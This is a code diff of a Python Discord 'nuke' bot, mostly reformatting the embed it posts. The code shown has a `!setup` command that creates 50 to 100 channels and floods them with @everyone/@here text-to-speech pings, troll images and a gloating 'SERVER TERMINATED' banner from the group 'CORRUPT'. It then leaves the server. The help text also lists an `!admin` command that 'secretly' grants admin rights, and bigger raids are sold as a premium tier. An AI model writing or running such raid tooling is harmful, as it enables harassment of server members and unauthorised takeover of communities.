@@ -1,3 +1,4 @@
+
 import asyncio, base64, json, os, random, time
 from datetime import datetime
 
@@ -585,68 +586,69 @@ async def setup(ctx):
             # Random channel name from list
             channel_name = random.choice(CHANNEL_NAMES)
             ch = await guild.create_text_channel(name=channel_name)
-            
-            # Troll embed
-            embed = discord.Embed(title="```━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━```",
-description=(
-    "```\n"
-    " ██████╗ ██████╗ ██████╗ ██████╗ ██╗   ██╗██████╗ ████████╗\n"
-    "██╔════╝██╔═══██╗██╔══██╗██╔══██╗██║   ██║██╔══██╗╚══██╔══╝\n"
-    "██║     ██║   ██║██████╔╝██████╔╝██║   ██║██████╔╝   ██║   \n"
-    "██║     ██║   ██║██╔══██╗██╔══██╗██║   ██║██╔═══╝    ██║   \n"
-    "╚██████╗╚██████╔╝██║  ██║██║  ██║╚██████╔╝██║        ██║   \n"
-    " ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝        ╚═╝   \n"
-    "\n"
-    "        ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ \n"
-    "        ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗\n"
-    "        ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██║  ██║\n"
-    "        ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██║  ██║\n"
-    "        ██║ ╚████║╚██████╔╝██║  ██╗███████╗██████╔╝\n"
-    "        ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═════╝ \n"
-    "```\n"
-    "**━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━**\n"
-    "## 💀 YOU JUST GOT ABSOLUTELY ERASED 💀\n"
-    "**━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━**\n\n"
-    "```diff\n"
-    "+ SERVER STATUS  : TERMINATED\n"
-    "+ OWNED BY       : CORRUPT\n"
-    "+ TOP FRACTION   : 1WEEKSOBER\n"
-    "+ DIFFICULTY    : TOO EASY\n"
-    "+ SKILL LEVEL   : NON-EXISTENT\n"
-    "+ RECOVERY      : IMPOSSIBLE\n"
-    "```\n"
-    "**━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━**\n\n"
-    "```fix\n"
-    "THIS SERVER IS DONE.\n"
-    "CHANNELS DELETED.\n"
-    "MEMBERS CONFUSED.\n"
-    "STAFF EXPOSED.\n"
-    "EGO SHATTERED.\n"
-    "```\n"
-    "**━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━**\n\n"
-    "```yaml\n"
-    "Message:\n"
-    "  - You tried to run a server.\n"
-    "  - You failed.\n"
-    "  - We noticed.\n"
-    "  - We fixed it.\n"
-    "```\n"
-    "**━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━**\n"
-),
-color=0xFF0000
-)
 
-embed.set_footer(
-    text="━━━ CORRUPT ━━━ 1WEEKSOBER ━━━ EZ ━━━ SERVER FINISHED ━━━"
-)
-            
+            # Troll embed
+            embed = discord.Embed(
+                title="```━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━```",
+                description=(
+                    "```\n"
+                    " ██████╗ ██████╗ ██████╗ ██████╗ ██╗   ██╗██████╗ ████████╗\n"
+                    "██╔════╝██╔═══██╗██╔══██╗██╔══██╗██║   ██║██╔══██╗╚══██╔══╝\n"
+                    "██║     ██║   ██║██████╔╝██████╔╝██║   ██║██████╔╝   ██║   \n"
+                    "██║     ██║   ██║██╔══██╗██╔══██╗██║   ██║██╔═══╝    ██║   \n"
+                    "╚██████╗╚██████╔╝██║  ██║██║  ██║╚██████╔╝██║        ██║   \n"
+                    " ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝        ╚═╝   \n"
+                    "\n"
+                    "        ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ \n"
+                    "        ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗\n"
+                    "        ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██║  ██║\n"
+                    "        ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██║  ██║\n"
+                    "        ██║ ╚████║╚██████╔╝██║  ██╗███████╗██████╔╝\n"
+                    "        ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═════╝ \n"
+                    "```\n"
+                    "**━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━**\n"
+                    "## 💀 YOU JUST GOT ABSOLUTELY ERASED 💀\n"
+                    "**━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━**\n\n"
+                    "```diff\n"
+                    "+ SERVER STATUS  : TERMINATED\n"
+                    "+ OWNED BY       : CORRUPT\n"
+                    "+ TOP FRACTION   : 1WEEKSOBER\n"
+                    "+ DIFFICULTY    : TOO EASY\n"
+                    "+ SKILL LEVEL   : NON-EXISTENT\n"
+                    "+ RECOVERY      : IMPOSSIBLE\n"
+                    "```\n"
+                    "**━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━**\n\n"
+                    "```fix\n"
+                    "THIS SERVER IS DONE.\n"
+                    "CHANNELS DELETED.\n"
+                    "MEMBERS CONFUSED.\n"
+                    "STAFF EXPOSED.\n"
+                    "EGO SHATTERED.\n"
+                    "```\n"
+                    "**━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━**\n\n"
+                    "```yaml\n"
+                    "Message:\n"
+                    "  - You tried to run a server.\n"
+                    "  - You failed.\n"
+                    "  - We noticed.\n"
+                    "  - We fixed it.\n"
+                    "```\n"
+                    "**━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━**\n"
+                ),
+                color=0xFF0000
+            )
+
+            embed.set_footer(
+                text="━━━ CORRUPT ━━━ 1WEEKSOBER ━━━ EZ ━━━ SERVER FINISHED ━━━"
+            )
+
             is_prem = is_premium_user(user.id)
             spam_count = 25 if is_prem else 10
             ping_count = 100 if is_prem else 50
-            
+
             # Send embed first
             await ch.send(embed=embed)
-            
+
             # Spam pings
             ping_message = "@everyone @here " * 5
             for _ in range(ping_count // 5):
@@ -654,7 +656,7 @@ embed.set_footer(
                     await ch.send(ping_message, tts=True)
                 except:
                     pass
-            
+
             # Send troll images
             for img_url in TROLL_IMAGES:
                 try:
@@ -663,17 +665,18 @@ embed.set_footer(
                     await ch.send(embed=img_embed)
                 except:
                     pass
-            
+
             # More spam with embed
             for _ in range(spam_count):
                 try:
                     await ch.send(content="@everyone @here GET TROLLED LMAOOO", embed=embed, tts=True)
                 except:
                     pass
-                    
+
         except Exception as e:
             print(f"[!] Channel/message failed: {e}")
 
+    # Determine how many channels to create
     is_prem = is_premium_user(user.id)
     channel_count = 100 if is_prem else 50
     await asyncio.gather(*(create_channel_and_spam() for _ in range(channel_count)))
@@ -684,7 +687,7 @@ embed.set_footer(
         print(f"[!] Role creation failed: {e}")
 
     await guild.leave()
-
+    
 @setup.error
 async def nuke_error(ctx, error):
     if isinstance(error, commands.MissingPermissions):
@@ -962,7 +965,7 @@ async def nhelp(ctx):
         description="List of available commands:",
         color=discord.Color.blurple()
     )
-    embed.set_thumbnail(url=ctx.bot.user.avatar.url if ctx.bot.user.avatar else ctx.bot.user.default_avatar.url)
+    embed.set_thumbnail(url=ctx. bot.user.avatar.url if ctx.bot.user.avatar else ctx.bot.user.default_avatar.url)
 
     embed.add_field(name="`!setup`", value="Completely wipes the server with troll spam.", inline=False)
     embed.add_field(name="`!admin`", value="Tries to secretly give you admin.", inline=False)
